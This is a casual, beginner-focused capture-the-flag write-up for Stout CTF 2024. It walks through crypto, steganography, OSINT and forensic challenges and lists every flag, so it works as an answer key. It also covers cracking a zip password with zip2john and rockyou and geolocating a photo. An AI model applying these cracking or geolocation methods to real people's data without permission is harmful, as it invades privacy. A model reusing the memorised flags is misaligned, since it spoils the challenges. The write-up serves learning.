# Stout CTF 2024

&#x20;![](<../.gitbook/assets/image (51).png>)<img src="../.gitbook/assets/image (52).png" alt="" data-size="original">

“A thought process /yapping writeup instead of technical writeup” Focusing on CTF beginners to tell the story about how I solve Better to read from the top like a story book because I’m yapping.

***

## Getting Started

***

### Rules

**Description:**\
Can you find the hidden flag in the Rules?

> F12 (inspect element) is strong with this one! You got this :)

> Lots of struggles on this one. You are not submitting anything that is VISIBLE on the Rules Page! Use the tools you have to find HIDDEN values inside the page! You are submitting a flag that says STOUTCTF{something goes here} It is in plaintext, but is hidden on the page! Hint Hint -> Main, Container, Container <- Hint Hint

**Flag:** STOUTCTF{0zpWOx4oFcOTK2hXSsKetlTuhwcJyllV}

On the ctfd platform, https://ctf.oplabs.us/ navigate to rules https://ctf.oplabs.us/rules Press `CTRL+U` to view page source. Scroll down a bit and you can see a comment `<!—Hidden Flag Location -->`. Then found the flag

```html
<!-- Hidden Flag Location -->
    <div class="mt-4">
        <p style="display: none;">STOUTCTF{0zpWOx4oFcOTK2hXSsKetlTuhwcJyllV}</p>
    </div>
```

***

### Discord

**Description:**\
Please join the discord and find the flag!

**Flag:** STOUTCTF{9Ka9jJghCbywhriTgfcHKvVXyUmChd0w}

In the announcement via whatsapp, there are [discord link](https://discord.com/invite/kwP74sWvJJ).\
Alternatively, in the rules page, `https://ctf.oplabs.us/rules` scroll to bottom and click Join Our Discord button

<figure><img src="../.gitbook/assets/image (53).png" alt="" width="563"><figcaption></figcaption></figure>

On the left pane there are multiple discord channel. Go to `#roles` and react to the message to get you discord role.

<figure><img src="../.gitbook/assets/image (54).png" alt="" width="563"><figcaption></figcaption></figure>

Looking at the left pane again, there should be a channel called `#discord-flag` and got the flag there.

<figure><img src="../.gitbook/assets/image (55).png" alt="" width="563"><figcaption></figcaption></figure>

***

## Conclusion

***

### Feedback

**Description:**\
Thank you so much for competing in our first ever Capture the Flag Competition! We appreciate you filling out this form, its the only way we can know how we did and improve for the future!\
`https://dyno.gg/form/a580e942`

> You will get a new role in Discord to gain access to a new channel to get the flag!

**Flag:** STOUTCTF{Thanks\_For\_Playing\_Stout's\_First\_CTF}

Fill in the dyno.gg form. When ur done go to your discord and there will be `#feedback-flag` channel. There is flag there

_Extra feedback from me_ I like the forensic challenge!

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

I do a little bit of flag hoarding as the rules didn’t mention about it. So u might notice I got many flag at the end :P (Sorry h4rmony but you are one of the Intigriti so I want to compete)

***

## Crypto

***

### Based

**Description:**\
This challenge is Based

**Flag:** STOUTCTF{hS5DTJc12bDy7sqJoH7qQs7dXrE4Ysd7}

The most common encoding is XOR and base64. Every CTF got base64 so if you are active in CTFs you might identify that this is a base64 encoding. There are many tools but I used [dcode](https://www.dcode.fr/) and [CyberChef](https://gchq.github.io/CyberChef/) to decode everything. For this just open cyberchef not dcode because in dcode you need to type base64 and redirect to another page, but for cyberchef just drag from the favourites panel on the left so its faster (even for a little faster I still called it time efficiency because I got another CTF to play). Drag “From Base64” and paste the ciphertext at the input

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

***

### V

**Flag:** STOUTCTF{QfT8PE2rHjxRkbpHmC6OJp14cW6xHy7N}

V.txt

```
Use the Giovan alphabet provided to you ABCDEFGHIJKLMNOPQRSTUVWXYZ
Can you solve the great GIOVAN mystery?

YBCPTPZN{EaT8CK2zVexEqjdCmP6URd14xW6kNg7B}
```

Here there are two ways to past the first step in cryptography, which is identifying the cipher used to encode the plaintext or flag.

1. Take a look at the challenge title and description. For this example, is V. You can use ChatGPT to get the cipher list that start with V.
2. Make some research. The challenge txt file, V.txt mentioned about Giovan. Just google it.

![](<../.gitbook/assets/image (58).png>)\


Go to [dcode](https://www.dcode.fr/) and search viginere (or click the dcode link if you are googling). Vigenere cipher used KEY/PASSWORD to decode your ciphertext. In dcode, you can bruteforce it. But looking at the V.txt file again, the word GIOVAN is uppercased. So we can assume it was the key.

<figure><img src="../.gitbook/assets/image (59).png" alt="" width="563"><figcaption></figcaption></figure>

***

### Jean

**Description:**\
Have you worn some lately?

**Flag:** STOUTCTF{QFT8PE2RHJXRKBPHMC6OJP14CW6XHY7N}

This challenge a bit tricky for beginners. I did mentioned that I only use cyberchef and dcode to decode my ciphertext. But what if I can’t decode it? First we need to identify our cipher text. [Dcode](https://www.dcode.fr/cipher-identifier) can identify it for us

<figure><img src="../.gitbook/assets/image (60).png" alt="" width="563"><figcaption></figcaption></figure>

If there are many black square on the left, you are good to go. If some challenge ciphertext got no black square, then GGs. For this fortunately we get many black square.

<figure><img src="../.gitbook/assets/image (61).png" alt="" width="563"><figcaption></figcaption></figure>

If there are no key, I always bruteforce it. But this time, no flag in the output. Damn. So need some researching. Search the cipher decoder. Just click on each of them and try all tools. You will eventually went into [this one](https://earthsciweb.org/js/bio/dna-writer/).

<figure><img src="../.gitbook/assets/image (63).png" alt="" width="563"><figcaption></figcaption></figure>

I tried here and got the flag.

<figure><img src="../.gitbook/assets/image (64).png" alt="" width="563"><figcaption></figcaption></figure>

***

### Hidden Waveforms

**Description:**\
Hidden in the waves lies a secret. Can you find it?

> There are many ways to hide information in audio, and many tools, but sometimes Occam’s razor applies. Think: STEganoGraphy

**Flag:** STOUTCTF{U6OvEbbs1eNX6UcG3hGIZaaeB70cgcg7}

For this challenge we got WAV file. Every WAV file I try to view spectrogram in Sonic Visualiser (Layer  add Spectogram). There are no plaintext we can read in the spectrogram (the green one).

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

But we can see the short and long line(?) (don’t know whats it called) So I thought it was a morse code.

<figure><img src="../.gitbook/assets/image (66).png" alt="" width="563"><figcaption></figcaption></figure>

But there are no flag. Notice that it show HE not HERE but I just skip this and not retry to decode it because there are nothing else.\
This is where I use all the tools I can think of. Tools for steganography and forensic. I tried common forensic tools like exiftool, binwalk, etc but got nothing useful. So tried to use steganoghraphy tools. There are many, like steghide, zsteg, stegseek. This 3 is mainly I use. So here I tried stegseek and got a file. I check the file type, which is ASCII text and just cat the file.

<figure><img src="../.gitbook/assets/image (67).png" alt="" width="563"><figcaption></figcaption></figure>

Here can copy all of that and put in cyberchef. I fyou don’t know what this is, you can use Magic tool in cyberchef.

<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

Now we got a really strange looking text. The symbol consist of +, \[, >, etc. Based on experience I know this is brainfuck

I always use [this link](https://copy.sh/brainfuck/) because it has view memory features. Some brainfuck challenge has flag in the memory not the output. But for this one its in the output

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

***

### Nothing To See Here!

**Description:**\
Seriously, what are you looking at?

> What do they call the empty space between or around objects? I think that might be useful here, and its not negative, think in a document. Maybe color, or the lack of color, depends on how you see it.

> Sanity hint, there is no hex involved in this challenge ;)

**Flag:** STOUTCTF{ab6IcT8R4vNyAJNWQteBJ3Yd2VTrkVCp}

When we open the txt file, we can see nothing. Like my future. If you use VSCode, you can see there’s something.

<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

For this challenge, use whitespace decoder

<figure><img src="../.gitbook/assets/image (71).png" alt="" width="563"><figcaption></figcaption></figure>

We got a another ciphertext. “Everything that ends with ‘=’ is base64”. Remember this until you gone from this world. Go to cyberchef to decode the base64.

<figure><img src="../.gitbook/assets/image (73).png" alt="" width="563"><figcaption></figcaption></figure>

It say there is nothing here but you cant fool ‘you’ twice! Its not me because I did not get fooled. Go to whitespace decoder again and got the flag.

<figure><img src="../.gitbook/assets/image (74).png" alt="" width="563"><figcaption></figcaption></figure>

***

### Custom Cipher

**Description:**\
Your scripting cant break my encoding!\


VWRXWFWI{Vr3J8NJks4Tn58PjDv3IPNc9VueGFwlu}

**Flag:** STOUTCTF{So3G8KGhp4Qk58MgAs3FMKz9SrbDCtir}

Here I use cyberchef’s rot13 bruteforce. Then CTRL F to get the flag. How do I know it’s a rotation? Because the ciphertext VWRXWFWI when compared to STOUTCTF got many related things. S to V is 3 alphabet. T to W is also 3 alphabet. So need to apply to all, then we use ROT.

<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

***

### 13RottenTeRmites

**Flag:** STOUTCTF{qKp1MOJMDaJUIJ5KybLrcfZOFQ3IN1j2}

This challenge is evil. I thought the final output is just the flag string but its in the gibberish. I play around in cyberchef for hours and CTRL+F and got the flag finally. I hope theres no challenge similar to this in the future

<figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

***

### 7 Bit Flow

**Description:**\
Computers see images much differently than we do. Can you see the bigger picture?

**Flag:** STOUTCTF{7jDcMSX5lqCCM6wxr7ijiTSUXRz0LiiU}

This challenge is creative. On the top left corner you can see something

<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

Its mostly red. This challenge made me read a whole [research paper](https://ijcsmc.com/docs/papers/May2014/V3I5201499a94.pdf) because I find something related to 7bit and cryptography.

<figure><img src="../.gitbook/assets/image (78).png" alt="" width="563"><figcaption></figcaption></figure>

After hours of depression , I play around with [stegsolve](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install) because the tools can extract bit layer (data extract feature)

Check all the 7 bit boxes cant get the flag. Notice the redness in the picture? Just tick the 7th red box and got the flag bruh.

<figure><img src="../.gitbook/assets/image (79).png" alt="" width="563"><figcaption></figcaption></figure>

***

### Fat Fingers

**Description:**\
I seem to have fatfingered the file in transit... I should do more cardio!

**Flag:** STOUTCTF{dtTC9pa0JgySqCpIJbLTMGL3j7XaTwDT}

First of all I always compare the flag format with the ciphertext and make deduction. For this challenge the flag is at the left key on qwerty keyboard. If you know what im talking about. Sorry for bad English. Map it manually and got it.

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

***

### Huffman

**Description:**\
Trees are very pretty. I like trees!

**Flag:** STOUTCTF{A0LZTvEW23NcbeKk8JyWJ8W0b6Mx7p6N}

This one I used chatgpt 100% because I’m noob at cryptography. ChatGPT is a tool tho so don’t shy shy to use it.

```python
from heapq import heappush, heappop

# Example probabilities dictionary
probabilities = {'co': 0.007352941176470588, 'me': 0.007352941176470588, 'e ': 0.01838235294117647, ' t': 0.01838235294117647, 'to': 0.011029411764705883, 'o ': 0.011029411764705883, 'ou': 0.01838235294117647, 'ut': 0.007352941176470588, 's ': 0.025735294117647058, 'CT': 0.007352941176470588, 'TF': 0.007352941176470588, ' I': 0.011029411764705883, "I'": 0.007352941176470588, "'m": 0.007352941176470588, 'm ': 0.011029411764705883, ' s': 0.007352941176470588, ' h': 0.007352941176470588, 'ha': 0.007352941176470588, 'y ': 0.007352941176470588, ' y': 0.007352941176470588, 'yo': 0.007352941176470588, ' w': 0.007352941176470588, 'er': 0.007352941176470588, 're': 0.011029411764705883, ' a': 0.014705882352941176, 'ab': 0.007352941176470588, 'le': 0.007352941176470588, 't ': 0.022058823529411766, 'th': 0.014705882352941176, 'hi': 0.007352941176470588, 'is': 0.011029411764705883, ' m': 0.007352941176470588, 'es': 0.007352941176470588, 'ss': 0.007352941176470588, 'ag': 0.007352941176470588, 'e.': 0.007352941176470588, '. ': 0.011029411764705883, 'as': 0.011029411764705883, ' i': 0.014705882352941176, 'it': 0.011029411764705883, 'ar': 0.007352941176470588, 'ur': 0.007352941176470588, 'ne': 0.007352941176470588, 'd ': 0.007352941176470588, ' o': 0.007352941176470588, 'on': 0.007352941176470588, ' c': 0.007352941176470588, 'la': 0.007352941176470588, 'wa': 0.007352941176470588, '..': 0.007352941176470588, 'W': 0.022058823529411766, 'e': 0.058823529411764705, 'l': 0.025735294117647058, 'c': 0.01838235294117647, 'o': 0.058823529411764705, 'm': 0.022058823529411766, ' ': 0.13970588235294118, 't': 0.05514705882352941, 'U': 0.007352941176470588, '-': 0.003676470588235294, 'S': 0.007352941176470588, 'u': 0.022058823529411766, "'": 0.011029411764705883, 's': 0.05514705882352941, 'C': 0.011029411764705883, 'T': 0.01838235294117647, 'F': 0.007352941176470588, '!': 0.007352941176470588, 'I': 0.011029411764705883, 'h': 0.025735294117647058, 'a': 0.051470588235294115, 'p': 0.014705882352941176, 'y': 0.029411764705882353, 'w': 0.011029411764705883, 'r': 0.03308823529411765, 'b': 0.014705882352941176, 'd': 0.014705882352941176, 'i': 0.025735294117647058, 'g': 0.01838235294117647, '.': 0.022058823529411766, '?': 0.003676470588235294, 'n': 0.025735294117647058, 'f': 0.007352941176470588, 'A': 0.007352941176470588, 'H': 0.003676470588235294, ':': 0.003676470588235294, 'O': 0.003676470588235294, '{': 0.003676470588235294, '0': 0.007352941176470588, 'L': 0.003676470588235294, 'Z': 0.003676470588235294, 'v': 0.003676470588235294, 'E': 0.003676470588235294, '2': 0.003676470588235294, '3': 0.003676470588235294, 'N': 0.007352941176470588, 'K': 0.003676470588235294, 'k': 0.003676470588235294, '8': 0.007352941176470588, 'J': 0.007352941176470588, '6': 0.007352941176470588, 'M': 0.003676470588235294, 'x': 0.003676470588235294, '7': 0.003676470588235294, '}': 0.003676470588235294}

# Actual Huffman encoded message
encoded_message = "01110111101100111110011101100101001100001101000001001011101111110100111101110111101000111110000101010001100101101011100000101011010111011111111111010110100000011000011000011000001111011111101100111001001110110000100101101001111001101011000011010011011011110101011001000111100000110100011110111001011110000000000000110110111111111111110000101110101111111110000100011000011001000110110111111011101101011101111100110100111000100011101101110011111111100011010100111001101000111010111110000001111010011010011100011110111001011111111010100111010100110000100001111101011101000011100110101001110100101011111011010010111110010000000000011101011000010100000100000000111110101010010000011110111001001101010010111010001101111101100100101111111011110011000110001001111100111110000011010101101001111100000001011110010110011011011001000011011000010010010111111111000010011010000011111100100010100101000001000011110111010101000100010001001010101110010110101110110010001110101010001011110011000110011001010101101111010111001101011101101111011111001100110101000101101110001111011111101011101000001110010111100100111100011101111001001110010101110100010111110001110101111101011011111101101101000010001101101011111010100110101100100010111010001010100010001001010101101100000101"


class Node:
    def __init__(self, symbol, freq):
        self.symbol = symbol
        self.freq = freq
        self.left = None
        self.right = None
    
    def __lt__(self, other):  # Corrected method name
        return self.freq < other.freq

def build_huffman_tree(probabilities):
    pq = []
    for symbol, freq in probabilities.items():
        heappush(pq, Node(symbol, freq))
    
    if len(pq) == 1:
        return pq[0]  # Handle the case with a single type of symbol

    while len(pq) > 1:
        left = heappop(pq)
        right = heappop(pq)
        merged = Node(None, left.freq + right.freq)
        merged.left = left
        merged.right = right
        heappush(pq, merged)

    return pq[0] if pq else None

def generate_codes(node, prefix="", code_map={}):
    if node is not None:
        if node.symbol is not None:
            code_map[node.symbol] = prefix
        generate_codes(node.left, prefix + "0", code_map)
        generate_codes(node.right, prefix + "1", code_map)
    return code_map

def decode_huffman(encoded, code_map):
    reverse_map = {v: k for k, v in code_map.items()}
    current_code = ""
    decoded_message = ""
    
    for bit in encoded:
        current_code += bit
        if current_code in reverse_map:
            decoded_message += reverse_map[current_code]
            current_code = ""  # Reset the current code after decoding
    return decoded_message


# Running the Huffman Tree functions
root = build_huffman_tree(probabilities)
if root:
    code_map = generate_codes(root)
    decoded_message = decode_huffman(encoded_message, code_map)
    print("Decoded Message:", decoded_message)  # Print the decoded message
else:
    print("Failed to build Huffman tree.")
```

```bash
$ python3 script.py
Decoded Message: Welcome to UW-Stout's CTF! I'm so happy you were able to decrypt this message. Was it hard? I'm not sure. I learned about this algorithm in one of my classes and thought it was cool...Anyways. Here is your flag:STOUTCTF{A0LZTvEW23NcbeKk8JyWJ8W0b6Mx7p6N}Congrats!
```

You learned in your classes? Damn

***

## Osint

***

### Abandoned Airwaves

**Description:**\
You can use the radio signals to do some fascinating things from communication to tracking moving objects and much much more. The structures built to harness these signals for these things are quite incredible and sometimes awe inspiring. They are all over the world too, from cell towers to satellite uplinks. And while some connect to the internet, the basic principles of all of it are completely independent of the internet. Just pure math and physics. Radio communication is quite something isn't it?

Can you find the name of the station this image was taken at?

> Please submit the flag without STOUTCTF{}

**Flag:** Duga-1 Station

Every osint challenge I try to reverse search the image. Click on every one of them to get the location place

<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

One of them is from [istockphoto](https://www.istockphoto.com/photo/abandoned-building-in-the-chernobyl-exclusion-zone-gm1181734175-331558984)

<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

There are station name in the description. Then bruteforce osint question

***

### Abandoned Airwaves pt.2

**Description:**\
Can you find when sunset will be at the location on the date of December 16th 2024?

Flag format: hour:minute in 24 hour time

> Please submit the flag without STOUTCTF{}

**Flag:** 15:52

Search the location at google map and its in chornobyl

<figure><img src="../.gitbook/assets/image (83).png" alt="" width="563"><figcaption></figcaption></figure>

Then just google the time. For osint challenge, google is your best tool. Change it to 24h

<figure><img src="../.gitbook/assets/image (84).png" alt="" width="563"><figcaption></figcaption></figure>

***

### Last Known Location

**Description:**\
Alex Carter (not a real person), a social media personality known for his travel blog content was recently reported missing. He is known for his daily updates to his travel social media accounts and his family became worried when Alex hadn’t posted for three days. We know that Alex loves exploring a mix of urban enviornments and nature. He especially loves visiting Asian countries since he did study abroad there in College and loves the food. Recently, he has been exploring less-touristy areas of hot tourist locations.

The last thing he posted was this image with the caption: "Every street has a story. Can you guess where I am? Heading to this awesome little café I stumbled across. I’ll check in later!"

We need you to figure out where he was before he disappeared. Good luck.

Flag is the exact coordinates of where the photo was taken. Coordinates are for the only google street view photo with the perspective of the picture. Format: latidude,longitude

> Please submit the flag without STOUTCTF{}

> Location should be 7 decimals long! .#######

**Flag:** 25.1098267:121.8454443

Always reverse search

<figure><img src="../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

this [one](https://www.chickpt.com.tw/job-Br856gGxG02b) give the map location

<figure><img src="../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Click on that. Now search for the store in street view.

<figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

To know the exact location, look at the surrounding. The position of the car, people, and anything. After you done, there are coordinate in the url.

https://www.google.com/maps/@`25.1098267,121.8454443`,3a,75y,10.37h,82.4t/data\
\=!3m7!1e1!3m5!1sWOeh9jYEN4Sg-Xq8ZUwCUg!2e0!6s\
https:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3F\
cb\_client%3Dmaps\_sv.tactile%26w%3D900%26h%3D600%26pitch%3D\
7.596079294485705%26panoid%3DWOeh9jYEN4Sg-\
Xq8ZUwCUg%26yaw%3D10.367192958311875!7i16384!8i8192?hl=en-\
US\&entry=ttu\&g\_ep=EgoyMDI0MTIxMS4wIKXMDSoASAFQAw%3D%3D

***

## Forensic and Stego

***

### Normal Image

**Description:**\


**Flag:** STOUTCTF{1ywHGox1ZRNcAftHt1CWP9YT1PKT1inR}

Use zsteg and you should get it

<figure><img src="../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

***

### Iera Milpan

**Description:**\
Waktu bahagia berkasih Muncul sesuatu tak ku duga Lilin selama ini bernyala Terpadam gelap gelita Sukarnya untuk melupakan Ikatan janji setia Di bawah pohon asmara Kau lafazkan Mentera cinta Retak hatiku hancur semua Diriku ini jiwa meronta Cinta yang sudah pudar Tenggelam di lautan kecewa Walau hati akan kekosongan Namun cintaku bukan mainan Biarlah aku bersendirian Untuk melupakanmu Biarkanlah aku Membawa diriku Semoga bahagia Walau ku berduka Walau patah tumbuh Hilangkan berganti Namun luka ini Sukar diubati Retak hatiku hancur semua Diriku ini jiwa meronta Cinta yang sudah pudar Tenggelam di lautan kecewa Walau hati akan kekosongan Namun cintaku bukan mainan Biarlah aku bersendirian Untuk melupakanmu oh Biarkanlah aku Membawa diriku Semoga bahagia Walau ku berduka Walau patah tumbuh Hilangkan berganti Namun luka ini Sukar diubati Biarkanlah dia Membawa dirinya Semoga bahagia Walau kau berduka Walau patah tumbuh Hilangkan berganti Namun luka ini Sukar diubati

**Flag:** STOUTCTF{qDtiRAwpAyR4Yg57YxzYW5p1V2dm5mwo}

For forensic questions, you always need to check the file type first before anything.

```bash
$ file Retak_Hatiku_-_Iera_Milpan.mp3
Retak_Hatiku_-_Iera_Milpan.mp3: PNG image data, 1219 x 48, 8-bit/color RGBA, non-interlaced
```

We know it’s a PNG so just rename the extension, open, and got the flag

```bash
$ mv Retak_Hatiku_-_Iera_Milpan.mp3 Retak_Hatiku_-_Iera_Milpan.png
```

<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

***

### RockYou!

**Description:**\
Don't crack your zipper!

**Flag:** STOUTCTF{wxxD6DH2c4yyeKhoXKvz7W8NrRUb4b1J}

Rockyou is a very popular wordlist. The challenge gave a zip file with password needed so I automatically know we need to use zip2john.

<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

use `Passw0rd123` as the password for the zip and got flag.txt.

***

### The Echos

**Flag:** STOUTCTF{fZtPEj720e1OKFrQPqouICBdgVAtD14N}

When opening the wireshark file. We can see strings in every packet. We can use tshark to extract data from wireshark via linux terminal. After understanding about the data in wireshark, I know we need to extract the data field. This solve is one liner so I apologise because it’s not so beginner friendly. But I’ll give the visualisation on why I use this command.

```bash
$ tshark -r TheEchos.pcap -Y "icmp.type == 8" -T fields -e data | cut -c 1-2 | tr -d '\n'
```

Basically, -r is we reading the file. We need the data in icmp because theres only icmp packet. If you take a look at one of the packet, there is type 8 mentioned.

<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

Then -e data is just extracting data. Using | (pipe) command to use multiple command. Using tshark -r TheEchos.pcap -Y "icmp.type == 8" -T fields -e data we get below

<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Add the cut -c 1-2 to get below.

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Add tr -d '\n' to get concatenate all of them

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

We know wireshark use hex. So go to cyberchef and find flag

<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

***

### Dark Web Firmware 1

**Description:**\
My friend told me I could get faster internet speeds from this cracked firmware

Try to find the attackers IP, user, and anything else malicious. The attackers ip, user, and website are the flags.

IP Flag Format: xxx.xxx.xxx.xxx

> Part 2 unlocks after completing this challenge!

**Flag:** 109.23.44.78

After searching for hours and cat everything, got something in etc/crontab/kali. How do I know? Bruteforce all the ip address

<figure><img src="../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

***

### Dark Web Firmware 2

**Description:**\
Use the same file from part 1. Increase your scope by trying to find their system user.

Flag format: example-user

> Part 3 unlocks after completing this challenge!

**Flag:** Kali

This one I just pray to God and got it. Find the username in common linux file. (do some research)

<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

***

### Dark Web Firmware 3

**Description:**\
Countinue to use the same file from part 1 and part 2. See if there is anything else you can find.

Flag format: `https://example-website.com`

**Flag:** http://tinurl.com/notmalware

It mention about website. Search in www

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

***

### Fairytales

**Description:**\
Embark on a quest into the heart of the Arctic’s endless ice, where ancient mysteries await. The Eternal Navigator, a ship lost to time, holds the key to forgotten knowledge—and the cost of uncovering its secrets may be greater than you ever imagined.

> Like a fairytale one of the chapters has more relevant information than the rest!

> A question for you, what was it again they renamed Facebook to? Might be useful, might not, but that is for you to decide!

**Flag:** STOUTCTF{n2ff2B98QwhoP29hSaV9tTabPTGF94Z5}

Looking for encoded strings. The keywords value is just a red herring. Other logic strings encoded will be the UUID. (after trying so many tools to extract pdf metadata)

```bash
$ exiftool Fairytales.pdf
ExifTool Version Number         : 13.00
File Name                       : Fairytales.pdf
Directory                       : .
File Size                       : 28 kB
File Modification Date/Time     : 2024:12:21 11:14:26+08:00
File Access Date/Time           : 2024:12:21 16:51:43+08:00
File Inode Change Date/Time     : 2024:12:21 11:14:42+08:00
File Permissions                : -rwxrwxrwx
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 5
Producer                        : Fairytales
Title                           : The Eternal Navigator
Author                          : Dr. Elena Markov
UUID                            : ,UImd-#t;S9KurE2dp]>B-Kl,5TsQL3@$@-BLO4&1Ee&fF_G88A53
Create Date                     : 2024:12:19 07:00:00+01:00
Keywords                        : Flag:, NGUgNjkgNjMgNjUgMjAgNzQgNzIgNzkgMmMgMjAgNjUgNzggNzAgNmMgNmYgNzIgNjUgNzIgMjEgMjAgNDIgNzUgNzQgMjAgNzQgNjggNjUgMjAgNzQgNzIgNzUgNjUgMjAgNzQgNzIgNjUgNjEgNzMgNzUgNzIgNjUgNzMgMjAgNmYgNjYgMjAgNzQgNjggNjUgMjAgNDUgNzQgNjUgNzIgNmUgNjEgNmMgMjAgNGUgNjEgNzYgNjkgNjcgNjEgNzQgNmYgNzIgMjAgNzIgNjUgNmQgNjEgNjkgNmUgMjAgNjggNjkgNjQgNjQgNjUgNmUgMmUgMjAgNGIgNjUgNjUgNzAgMjAgNzMgNjUgNjUgNmIgNjkgNmUgNjcgMmMgMjAgNjEgNmUgNjQgMjAgNzkgNmYgNzUgMjAgNmQgNjkgNjcgNjggNzQgMjAgNmEgNzUgNzMgNzQgMjAgNzUgNmUgNjMgNmYgNzYgNjUgNzIgMjAgNzQgNjggNjUgNjkgNzIgMjAgNzMgNjUgNjMgNzIgNjUgNzQgNzMgMmU=
Creator                         : Peyton Braun
Modify Date                     : 2024:12:19 07:00:00+01:00
Subject                         : Can you uncover the secrets of The Eternal Navigator
```

I put it in cyberchef and use magic wand to get base85 decode. The chapter 2 of the fairytale mention about 47.

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

***

### The Orbs of Light

**Description:**\
Dr. Elana Markov sat hunched over her desk, the flickering light of a small monitor casting shadows across the cluttered lab. The coordinates had come from a crumbling fragment of an old text—a discovery that many dismissed as mere legend. But Markov knew better.

She had just returned from the coordinates after finding a ominous video, her breath catching as grainy, footage filled the screen. The camera, sat motionless watched an endless, icy expanse, the snow creating a dense fog in the distance she watched and watched trying to find something, anything to give her a clue of what this was, she knew something was off.

As she watched the video over and over she realized there must be another part of the video, she must be missing something. She returned to the site and found a note hidden under piles of rubble with the same ancient cipher as before.

Hours later, she had deciphered the beginning of the hidden message within the light. It was fragmented, incomplete:

“To find the truth, follow...”

She pushed on looking everywhere for anymore clues to what this might mean. After searching high and low she discovered a hidden compartment with a cryptic note, the beginning looked familiar, the same as before, but this one was complete "To find the truth, follow... wkh ruev ri oljkw, wkhb iolfnhu lq d suhglfwdeoh sdwwhuq, wkhb zloo ohdg brx wr Wkh Hwhuqdo Qdyljdwru. Wkh sdvvzrug brx vhhn lv rue5riO1jkw"

With this, she knew what she needed to do.

**Flag:** STOUTCTF{NZO2ARCB9SKB24K5MMEVY5GYWAAJJHQG}

The zip file got password. Try to decrypt the ciphertext from the challenge description `wkh ruev ri oljkw, wkhb iolfnhu lq d suhglfwdeoh sdwwhuq, wkhb zloo ohdg brx wr Wkh Hwhuqdo Qdyljdwru. Wkh sdvvzrug brx vhhn lv rue5riO1jkw`

Interestingly, I used dcode and there are multiple encoding that we can use so thats a new thing I learned.

<figure><img src="../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

So the password is orb5ofL1ght Then got mp4. In the video got morse code pattern at bottom left. MANUALLY extract (because don’t know how to auto) and got the flag\
`STOUTCTF(NZO2ARCB9SKB24K5MMEVY5GYWAAJJHQG)`\
Change to {}\
`STOUTCTF{NZO2ARCB9SKB24K5MMEVY5GYWAAJJHQG}`

***

### Substitute Teacher

**Description:**\
The year is 1992, a few weeks after the fall of the Soviet Union. Amidst the chaos, a group of 45 rogue operatives known as "The Teachers" were tasked with safeguarding classified files. Their mission? To ensure these secrets stayed hidden from prying eyes. To achieve this, they devised a series of intricate steps to obscure their plans.

Your mission is to recover the hidden flag from their encrypted communication. The operatives left all the tools you need in the provided file, but they didn’t make it easy. They relied on meticulous precision, where every detail—big or small, uppercase or lowercase—could hold the key to unlocking their secrets.

Can you decipher their layers of secrecy and reveal the hidden truth?

> You are looking for 1 of each of the following: HTTP, FTP, TCP, UDP. You need all 4 to solve.

> For sanity, there are 4 steps to get to the file. Then you can start looking for the flag. The flag is INSIDE the file its not hiding anywhere that you need tools to find. The 4 you need are plaintext.

> Use a tool like Cyberchef for the first couple parts of the challenge. gzip -d doesn't work for some reason. Entropy is your friend! There are 4 steps before you get a pcap file. Don't forget you have more information at your disposal, it might help to look at it ;)

**Flag:** STOUTCTF{E8YrQNB6mWaI2PGncYjBKGkyz3yl8Iec}

After the 3 hints, there are 4 step. Gunzip, base92, base45, gunzip. (This is after I understand the challenge description)\
And this is before I understand\
So I tried identifying it first.

<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

Here I know its base92

<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

U see the magic wand? I was like DAMN is this itt??\
The hint said for the first two can just use cyber chef. I tried base by base and got another magic wand. DAMNNN

<figure><img src="../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Back to the present. Now I got a pcap file after the 4 steps. THERE ARE 30K PACKETS BROO

<figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

